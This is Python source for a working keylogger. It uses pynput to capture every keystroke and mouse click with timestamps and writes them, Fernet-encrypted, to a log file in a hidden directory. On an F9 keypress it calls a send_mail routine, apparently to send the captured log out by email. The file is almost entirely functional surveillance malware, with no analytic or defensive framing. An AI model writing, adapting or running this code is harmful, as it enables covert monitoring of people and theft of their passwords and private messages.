from pynput.keyboard import Listener as Keyboard_listener, Key
from pynput.mouse import Listener as Mouse_listener, Button
from utils import *
from threading import Thread
from send_mail import send_mail
from constants import LOG_FILE, HIDE_DIR
from os.path import join
from pickle import load, dump


def keyboard_press(key: Key) -> None:
    """
    on_press for keyboard listener.
    """
    # Flag variable, when press F9, exit_ = True,
    # terminate Keyboard listener and also terminate Mouse listener
    global exit_

    # Check if it's an alphanumeric key
    try:
        try:
            # Check if it's a combination key - goes with Ctrl
            key = CHARS[CODES.index(str(key).replace("'", ""))]
            key = f"「{key}」"

        # This can cause AttributeError (if it's not an alphanumeric key)
        except ValueError:
            key = str(key.char)

    # Else it's a special key
    except AttributeError:

        # Press F9 -> send mail AND terminate keylogger
        if key == Key.f9:
            write_to_log(f"\n\n「Keylogger terminated {get_time(day=True)}」")
            log_f.close()
            exit_ = True
            send_mail()
            return False

        # Enter -> create new line in log file + get time
        elif key == Key.enter:
            key = f"\n「••   {get_time(day=True)}」 "

        # For aesthetic
        elif key == Key.backspace:
            key = "「«×」"
        elif key == Key.delete:
            key = "「×»」"
        elif key == Key.space:
            key = "「_」"

        else:
            # For aesthetic
            key = str(key).replace("Key.", "")\
                  .replace("_l", "").replace("_r", "").replace("_gr", "")
            if key == "shift":
                key = "↑"
            key = f"「{key}」"

    write_to_log(key)


def mouse_click(x, y, button, pressed) -> None:
    """
    on_click for mouse listener.
    """
    if exit_:
        return False
    if pressed:
        if button == Button.left:
            button = "L"
        else:
            button = "R" if (button == Button.right) else "M"

        s = "\n「{:4d} {:4d} {} {}」 ".format(x, y, button, get_time())
        write_to_log(s)


def keyboard():
    """
    Keyboard thread.
    """
    with Keyboard_listener(on_press=keyboard_press) as keyboard_listener:
        keyboard_listener.join()


def mouse():
    """
    Mouse thread.
    """
    with Mouse_listener(on_click=mouse_click) as mouse_listener:
        mouse_listener.join()


def write_to_log(s: str) -> None:
    """
    Write data to the log file.
    """
    dump(fernet.encrypt(s.encode("utf-8")), log_f)


if __name__ == "__main__":
    # When goes with Ctrl, CHARS[i] is written as CODES[i] (0 <= i <= 35),
    # since the English alphabet has 26 letters from A to Z
    # and 10 digits from 0 to 9, so total is 36 chars
    CHARS = ("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K",
             "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V",
             "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6",
             "7", "8", "9"
    )
    CODES = (r"\x01", r"\x02", r"\x03", r"\x04", r"\x05", r"\x06",
             r"\x07", r"\x08", r"\t", r"\n", r"\x0b", r"\x0c",
             r"\r", r"\x0e", r"\x0f", r"\x10", r"\x11", r"\x12",
             r"\x13", r"\x14", r"\x15", r"\x16", r"\x17", r"\x18",
             r"\x19", r"\x1a", "<48>", "<49>", "<50>", "<51>",
             "<52>", "<53>", "<54>", "<55>", "<56>", "<57>"
    )

    # Initialization
    exit_ = False
    fernet = load(open("key.pkl", "rb"))
    log_f = open(join(HIDE_DIR, LOG_FILE), "ab")
    write_to_log(f"\n\n「Keylogger started {get_time(day=True)}」\n")

    # Create thread
    keyboard = Thread(target=keyboard)
    mouse = Thread(target=mouse)

    # Start both threads
    keyboard.start()
    mouse.start()

    # Wait until both threads are completely executed
    keyboard.join()
    mouse.join()
